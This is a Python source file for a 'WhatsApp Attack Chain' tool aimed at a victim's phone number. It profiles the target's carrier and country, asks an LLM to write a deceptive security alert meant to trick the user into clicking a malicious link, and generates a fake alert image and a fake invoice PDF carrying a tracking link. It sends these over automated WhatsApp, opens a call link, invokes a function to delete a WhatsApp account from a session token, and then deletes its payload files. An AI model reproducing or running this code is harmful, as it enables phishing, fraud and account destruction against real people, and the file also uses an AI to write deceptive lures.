import os
import re
import json
import time
import socket
import requests
from PIL import Image, ImageDraw, ImageFont
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from modules.wa_selenium_sender import WaSeleniumSender
from modules.wa_delete import delete_whatsapp_account
from modules.wa_delivery_fingerprint import WaDeliveryFingerprint
from modules.phishing import create_tracking_link
from modules.ai_manager import AIManager
from modules.utils import logger
from config import PHONE_VALIDATION_API_KEY

class WhatsAppAttackChain:
    def __init__(self):
        self.sender = WaSeleniumSender()
        self.fingerprint = WaDeliveryFingerprint()
        self.ai = AIManager()
        self.phone = None
        self.info = {}
        self.phish_msg = ""
        self.malicious_link = ""

    def _validate_phone(self, phone):
        cleaned = re.sub(r'[^0-9+]', '', phone)
        if not cleaned.startswith('+'):
            cleaned = '+' + cleaned
        if len(cleaned) < 10:
            raise ValueError("Invalid phone number (must include country code)")
        return cleaned

    def prep(self, phone):
        self.phone = self._validate_phone(phone)
        results = {}

        results['step1'] = {'status': 'OK', 'message': f'Phone {self.phone} format valid'}
        reg = self.fingerprint.exploit(self.phone)
        results['step2'] = reg
        call_url = f'https://wa.me/{self.phone}?call=1'
        results['step3'] = {'call_link': call_url}

        if PHONE_VALIDATION_API_KEY:
            try:
                resp = requests.get(
                    f"https://phonevalidation.abstractapi.com/v1/?api_key={PHONE_VALIDATION_API_KEY}&phone={self.phone}",
                    timeout=10
                )
                if resp.status_code == 200:
                    data = resp.json()
                    results['step4'] = {
                        'carrier': data.get('carrier', 'Unknown'),
                        'country': data.get('country', {}).get('name', 'Unknown')
                    }
                else:
                    results['step4'] = {'error': f'AbstractAPI HTTP {resp.status_code}'}
            except Exception as e:
                results['step4'] = {'error': str(e)}
        else:
            results['step4'] = {'error': 'PHONE_VALIDATION_API_KEY not set'}

        try:
            biz_url = f"https://web.whatsapp.com/business/profile/{self.phone}"
            resp = requests.get(biz_url, timeout=5)
            results['step5'] = {'business_profile_exists': resp.status_code == 200}
        except Exception as e:
            results['step5'] = {'business_profile_exists': False, 'error': str(e)}

        profile_path = '/app/whatsapp-profile/Default/Cookies'
        results['step6'] = {
            'profile_ready': os.path.exists(profile_path),
            'profile_path': profile_path
        }

        if self.ai and self.ai.groq_client:
            try:
                prompt = f"Generate a convincing WhatsApp security alert message to trick the user into clicking a malicious link. Target phone: {self.phone}. Keep it short (max 50 words)."
                self.phish_msg = self.ai.generate(prompt, max_tokens=80, temperature=0.7)
                results['step7'] = {'phish_msg': self.phish_msg}
            except Exception as e:
                results['step7'] = {'error': str(e), 'phish_msg': "Security alert: Verify your account immediately."}
        else:
            self.phish_msg = "Security alert: Verify your account immediately."
            results['step7'] = {'phish_msg': self.phish_msg}

        self.malicious_link = create_tracking_link(self.phone)
        results['step8'] = {'malicious_link': self.malicious_link}

        try:
            img_path = self._generate_image_payload(self.phone, self.malicious_link)
            results['step9'] = {'image_payload_path': img_path}
        except Exception as e:
            results['step9'] = {'error': str(e)}

        try:
            pdf_path = self._generate_pdf_payload(self.phone, self.malicious_link)
            results['step10'] = {'document_payload_path': pdf_path}
        except Exception as e:
            results['step10'] = {'error': str(e)}

        try:
            socket.gethostbyname('web.whatsapp.com')
            results['step11'] = {'network': 'OK'}
        except Exception as e:
            results['step11'] = {'network': 'FAIL', 'error': str(e)}

        results['step12'] = {
            'summary': 'Preparations complete. Target appears reachable.',
            'target': self.phone
        }

        self.info = results
        return results

    def _generate_image_payload(self, phone, link):
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (600, 400), color=(30, 30, 30))
        d = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 20)
        except:
            font = ImageFont.load_default()
        d.text((50, 50), f"Security Alert for {phone}", fill=(255, 100, 100), font=font)
        d.text((50, 100), "Click here to verify:", fill=(255, 255, 255), font=font)
        d.text((50, 140), link, fill=(100, 200, 255), font=font)
        d.text((50, 200), "This is an automated message.", fill=(200, 200, 200), font=font)
        filename = f"/tmp/payload_{int(time.time())}.png"
        img.save(filename)
        return filename

    def _generate_pdf_payload(self, phone, link):
        filename = f"/tmp/payload_{int(time.time())}.pdf"
        c = canvas.Canvas(filename, pagesize=letter)
        c.drawString(100, 750, f"Invoice for {phone}")
        c.drawString(100, 700, "Please verify your payment details:")
        c.drawString(100, 670, link)
        c.drawString(100, 630, "If you did not request this, click the link to cancel.")
        c.save()
        return filename

    def confirm_summary(self):
        summary = f"📱 **WhatsApp Attack Chain – Target {self.phone}**\n\n"
        for step, data in self.info.items():
            if isinstance(data, dict):
                if 'error' in data:
                    summary += f"- {step}: ⚠️ Error: {data['error']}\n"
                elif 'status' in data:
                    summary += f"- {step}: {data['status']}\n"
                elif 'message' in data:
                    summary += f"- {step}: {data['message']}\n"
                else:
                    summary += f"- {step}: {json.dumps(data)[:100]}\n"
            else:
                summary += f"- {step}: {data}\n"
        return summary

    def execute(self):
        if not self.phone:
            return {'error': 'Run prep first'}

        actions = {}

        if self.phish_msg and self.malicious_link:
            full_msg = f"{self.phish_msg}\n{self.malicious_link}"
            send_result = self.sender.send_message(self.phone, full_msg)
            actions['send_message'] = send_result
        else:
            actions['send_message'] = {'success': False, 'output': 'Phishing message or link missing'}

        try:
            img_path = self.info.get('step9', {}).get('image_payload_path')
            if img_path and os.path.exists(img_path):
                img_result = self.sender.send_image(self.phone, img_path, caption="Security alert – verify now")
                actions['send_image'] = img_result
            else:
                actions['send_image'] = {'success': False, 'output': 'Image payload not generated'}
        except Exception as e:
            actions['send_image'] = {'success': False, 'output': str(e)}

        try:
            import webbrowser
            webbrowser.open(f'https://wa.me/{self.phone}?call=1')
            actions['call'] = {'success': True, 'output': 'Call link opened in browser'}
        except Exception as e:
            actions['call'] = {'success': False, 'output': str(e)}

        wa_session = os.getenv('WA_SESSION', '')
        if wa_session:
            delete_result = delete_whatsapp_account(wa_session)
            actions['delete_account'] = delete_result
        else:
            actions['delete_account'] = {'success': False, 'output': 'WA_SESSION not set. Skipping deletion.'}

        try:
            if 'step9' in self.info and self.info['step9'].get('image_payload_path'):
                os.remove(self.info['step9']['image_payload_path'])
            if 'step10' in self.info and self.info['step10'].get('document_payload_path'):
                os.remove(self.info['step10']['document_payload_path'])
        except:
            pass

        return actions
